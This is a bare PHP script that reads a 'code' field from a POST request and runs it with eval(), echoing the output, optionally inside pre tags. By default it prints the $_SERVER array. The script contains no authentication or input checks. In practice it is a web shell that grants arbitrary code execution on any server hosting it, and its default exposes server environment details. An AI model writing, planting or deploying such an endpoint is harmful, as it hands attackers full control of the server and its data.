<?php
if(!isset($_POST['code']))
    $_POST['code'] = 'print_r($_SERVER);';

if(isset($_POST['go']))
{
    echo "<p>Result is:<br />";
    if($_POST['pre']=="on")
    {
      echo "<pre>";
      eval($_POST['code']);
      echo "</pre>";
    }
    else
      echo eval($_POST['code']);
}
  
?>